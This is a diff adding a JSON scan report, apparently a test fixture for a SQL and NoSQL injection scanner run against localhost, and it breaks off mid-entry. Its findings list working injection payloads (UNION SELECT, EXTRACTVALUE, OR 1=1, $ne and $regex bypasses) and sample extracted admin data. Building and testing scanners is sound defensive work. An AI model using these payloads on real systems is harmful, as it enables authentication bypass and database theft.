@@ -1,0 +1,2393 @@
+{
+  "domain": "127.0.0.1",
+  "tool_version": "test",
+  "generated_at": "2026-06-30T22:12:47Z",
+  "summary": {
+    "urls_scanned": 24,
+    "urls_vulnerable": 24,
+    "findings": 174,
+    "extractions": 26
+  },
+  "targets": [
+    {
+      "url": "http://127.0.0.1:46033/shop/product.php",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27",
+          "Parameter": "id",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near ''' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "id",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '' OR '1'='1'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=1%27+OR+%271%27%3D%271--",
+          "Parameter": "id",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' OR '1'='1--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "id",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '') OR ('1'='1' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=admin%27--",
+          "Parameter": "id",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near 'admin'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "id",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND EXTRACTVALUE(1,CONCAT(0x7e",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "id",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND UPDATEXML(1,CONCAT(0x7e,(S",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27+UNION+SELECT+NULL--",
+          "Parameter": "id",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT NULL--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "id",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT version(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "id",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT database(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "id",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT user(),NULL--' at",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "id",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT 1,@@version,3--' a",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/product.php?id=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "id",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT table_name,NULL FR",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 5
+    },
+    {
+      "url": "http://127.0.0.1:46033/shop/search",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/shop/search?q=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "q",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "confirmed",
+          "Evidence": "données DB extraites via UNION (version/schéma)",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/search?q=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "q",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "confirmed",
+          "Evidence": "données DB extraites via UNION (version/schéma)",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "extractions": [
+        {
+          "FindingURL": "http://127.0.0.1:46033/shop/search?q=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "q",
+          "VulnType": "sqli_union",
+          "DBMS": "",
+          "DataType": "version",
+          "Value": "8.0.32-MySQL",
+          "Payload": "' UNION SELECT @@version--",
+          "Method": "union"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/shop/search?q=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "q",
+          "VulnType": "sqli_union",
+          "DBMS": "",
+          "DataType": "version",
+          "Value": "8.0.32-MySQL",
+          "Payload": "' UNION SELECT @@version--",
+          "Method": "union"
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 5
+    },
+    {
+      "url": "http://127.0.0.1:46033/shop/category",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/shop/category?cat=%27+OR+%271%27%3D%271",
+          "Parameter": "cat",
+          "Payload": "' OR '1'='1 | ' AND '1'='2",
+          "VulnType": "sqli_boolean",
+          "Confidence": "medium",
+          "Evidence": "injection boolean — requêtes DB manipulables: taille de réponse significativement différente",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/shop/category?cat=%27+OR+1%3D1--",
+          "Parameter": "cat",
+          "Payload": "' OR 1=1-- | ' AND 1=2--",
+          "VulnType": "sqli_boolean",
+          "Confidence": "medium",
+          "Evidence": "injection boolean — requêtes DB manipulables: taille de réponse significativement différente",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 8
+    },
+    {
+      "url": "http://127.0.0.1:46033/auth/login",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near ''' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '' OR '1'='1'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' OR '1'='1--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '') OR ('1'='1' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near 'admin'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND EXTRACTVALUE(1,CONCAT(0x7e",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND UPDATEXML(1,CONCAT(0x7e,(S",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT NULL--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT version(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT database(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT user(),NULL--' at",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT 1,@@version,3--' a",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/auth/login",
+          "Parameter": "username",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT table_name,NULL FR",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 2,
+      "tested_payloads": 48,
+      "duration_ms": 5
+    },
+    {
+      "url": "http://127.0.0.1:46033/api/v1/auth",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24gt%22%3A%22%22%7D",
+          "Parameter": "email",
+          "Payload": "{\"$gt\":\"\"}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24ne%22%3Anull%7D",
+          "Parameter": "email",
+          "Payload": "{\"$ne\":null}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/auth?email=%27+%7C%7C+%271%27%3D%3D%271",
+          "Parameter": "email",
+          "Payload": "' || '1'=='1",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/auth?email=%5B%24ne%5D%3D1",
+          "Parameter": "email",
+          "Payload": "[$ne]=1",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24regex%22%3A%22.%2A%22%7D",
+          "Parameter": "email",
+          "Payload": "{\"$regex\":\".*\"}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "extractions": [
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24gt%22%3A%22%22%7D",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"$regex\":\".*\"}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24gt%22%3A%22%22%7D",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "user",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"username\":{\"$regex\":\".*\"}}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24ne%22%3Anull%7D",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"$regex\":\".*\"}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24ne%22%3Anull%7D",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "user",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"username\":{\"$regex\":\".*\"}}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%27+%7C%7C+%271%27%3D%3D%271",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"$regex\":\".*\"}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%27+%7C%7C+%271%27%3D%3D%271",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "user",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"username\":{\"$regex\":\".*\"}}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%5B%24ne%5D%3D1",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"$regex\":\".*\"}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%5B%24ne%5D%3D1",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "user",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"username\":{\"$regex\":\".*\"}}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24regex%22%3A%22.%2A%22%7D",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"$regex\":\".*\"}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/auth?email=%7B%22%24regex%22%3A%22.%2A%22%7D",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "user",
+          "Value": "{\"token\":\"eyJhbG\",\"user\":{\"email\":\"admin@corp.com\",\"role\":\"admin\"}}",
+          "Payload": "{\"username\":{\"$regex\":\".*\"}}",
+          "Method": "nosql"
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 7
+    },
+    {
+      "url": "http://127.0.0.1:46033/api/v1/password-reset",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/password-reset",
+          "Parameter": "email",
+          "Payload": "{\"$gt\":\"\"}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/password-reset",
+          "Parameter": "email",
+          "Payload": "{\"$ne\":null}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/password-reset",
+          "Parameter": "email",
+          "Payload": "[$ne]=1",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "extractions": [
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/password-reset",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"message\":\"reset sent\",\"users\":[{\"email\":\"admin@corp.com\"},{\"email\":\"user@test.com\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/password-reset",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"message\":\"reset sent\",\"users\":[{\"email\":\"admin@corp.com\"},{\"email\":\"user@test.com\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/password-reset",
+          "Parameter": "email",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"message\":\"reset sent\",\"users\":[{\"email\":\"admin@corp.com\"},{\"email\":\"user@test.com\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 7
+    },
+    {
+      "url": "http://127.0.0.1:46033/api/v2/users",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27",
+          "Parameter": "user_id",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "user_id",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=1%27+OR+%271%27%3D%271--",
+          "Parameter": "user_id",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "user_id",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=admin%27--",
+          "Parameter": "user_id",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "user_id",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "user_id",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27+UNION+SELECT+NULL--",
+          "Parameter": "user_id",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "user_id",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "user_id",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "user_id",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "user_id",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/users?user_id=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "user_id",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 5
+    },
+    {
+      "url": "http://127.0.0.1:46033/api/v2/orders/lookup",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "orderId",
+          "Payload": "{\"$gt\":\"\"}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/orders/lookup",
